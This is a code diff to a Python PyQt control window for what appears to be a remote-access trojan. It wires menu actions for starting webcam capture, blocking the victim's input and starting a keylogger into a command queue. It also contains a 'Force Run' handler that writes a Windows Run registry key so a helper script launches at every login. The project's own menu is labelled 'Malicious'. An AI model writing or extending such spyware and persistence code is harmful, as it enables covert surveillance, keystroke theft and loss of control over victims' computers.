@@ -13,12 +13,14 @@ from UI.ConnectionWindow import ConnWin
 from UI.UISettingsWindow import UISettingsWin
 from UI.Palettes import WhitePalette, DarkPalette, MidnightPalette
 
+
 from mssServ import Server
 from mssClient import Client
 
 from cv2 import cvtColor
 from numpy import zeros, uint8, ones
 from winreg import OpenKeyEx, CloseKey, SetValueEx, REG_SZ, HKEY_CURRENT_USER, KEY_SET_VALUE
+from collections import deque
 
 import numpy    #remove after
 
@@ -51,6 +53,8 @@ class Window(QMainWindow, Ui_MainWindow):
         #self.addAction(self.action_Bind)
         #self.addAction(self.action_Close)
         #self.menuMalicious.menuAction().setVisible(False)
+
+        self.cmdQueue = deque(maxlen=1024)
 
         self.fullscreenExitShortcut = QShortcut('ESC', self)
         self.fullscreenExitShortcut.activated.connect(lambda: self.ToggleFullscreen(self.windowState() & 11))   #change 3rd bit (fullscreen flag) to 0 (XXXX & 1011(11) = X0XX)
@@ -199,16 +203,17 @@ class Window(QMainWindow, Ui_MainWindow):
 
     @pyqtSlot()
     def on_action_Start_Cam_triggered(self):
-        pass
+        self.cmdQueue.append("Start Cam")
 
 
     @pyqtSlot()
     def on_action_Stop_Cam_triggered(self):
-        pass
+        self.cmdQueue.append("Stop Cam")
 
 
     @pyqtSlot()
     def on_action_Force_Run_triggered(self):
+        self.cmdQueue.append("Force Run")
         keyHandle = OpenKeyEx(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", access=KEY_SET_VALUE)
         SetValueEx(keyHandle, "remote", 0, REG_SZ, dirname(realpath(__file__)) + r"\helpers\run.py")
         CloseKey(keyHandle)
@@ -216,22 +221,22 @@ class Window(QMainWindow, Ui_MainWindow):
 
     @pyqtSlot()
     def on_action_Block_Input_triggered(self):
-        pass
+        self.cmdQueue.append("Block Input")
 
 
     @pyqtSlot()
     def on_action_Unblock_Input_triggered(self):
-        pass
+        self.cmdQueue.append("Unblock Input")
 
 
     @pyqtSlot()
     def on_action_Start_KeyLogger_triggered(self):
-        pass
+        self.cmdQueue.append("Start KeyLogger")
 
 
     @pyqtSlot()
     def on_action_Stop_KeyLogger_triggered(self):
-        pass
+        self.cmdQueue.append("Stop KeyLogger")
 
 
 if __name__ == '__main__':
